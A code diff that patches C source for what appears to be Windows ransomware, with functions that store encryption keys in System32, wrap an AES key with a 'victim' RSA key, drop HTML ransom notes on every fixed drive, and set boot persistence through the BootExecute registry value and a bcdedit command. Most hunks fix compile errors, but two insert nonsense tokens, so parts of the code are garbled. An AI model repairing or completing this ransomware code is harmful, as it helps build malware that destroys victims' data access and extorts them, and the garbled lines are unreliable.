@@ -122,7 +122,7 @@ static int save_keys(void) {
         return 0;
 
     wchar_t syspath[MAX_PATH];
-    GetSystemDirectoryW(syspath, MAX_PATH2);
+    GetSystemDirectoryW(syspath, MAX_PATH);
 
     /* Save key in System32 */
     wchar_t p[MAX_PATH];
@@ -157,7 +157,7 @@ static int encrypt_file(const wchar_t *path) {
 
     /* Export AES key encrypted with victim RSA key */
     BYTE ek[512];
-    DWORD eklen = sizeof(ek4);
+    DWORD eklen = sizeof(ek);
     if (!CryptExportKey(aes_key, g_victim_key, SIMPLEBLOB, 0, ek, &eklen)) {
         CryptDestroyKey(aes_key); VirtualFree(data, 0, MEM_RELEASE);
         return 0;
@@ -249,7 +249,7 @@ static void write_all_notes(void) {
     while (*dp) {
         if (GetDriveTypeW(dp) == DRIVE_FIXED) {
             wchar_t p[MAX_PATH];
-            wcscpy(p, dp); wcscat(p, RANSOM_NOTE.COM);
+            wcscpy(p, dp); wcscat(p, RANSOM_NOTE);
 
             /* Write the HTML ransom note */
             const char *html = 
@@ -320,7 +320,7 @@ static void install_persistence(void) {
         wchar_t boot_entry[] = L"felty_boot.exe\0";
         memcpy(buf + offset, boot_entry, sizeof(boot_entry));
         offset += sizeof(boot_entry);
-        buf[offset] = 0; buf[offset+1] = 0 synerg;
+        buf[offset] = 0; buf[offset+1] = 0 ;synerg;
         buf[offset+2] = 0; buf[offset+3] = 0;
 
         RegSetValueExW(hk, L"BootExecute", 0, REG_MULTI_SZ, buf, offset + 4);
@@ -397,7 +397,7 @@ static void install_persistence(void) {
     wchar_t cmd2[] = L"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures";
     CreateProcessW(NULL, cmd2, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     WaitForSingleObject(pi.hProcess, 3000);
-    CloseHandle(pi.hProcess); CloseHandle(pi.hThread etxek);
+    CloseHandle(pi.hProcess); CloseHandle(pi.hThread) etxek);
 
     /* 8. Copy boot.exe and binder.exe to System32 (would be resource in real build) */
     wchar_t boot_dest[MAX_PATH];
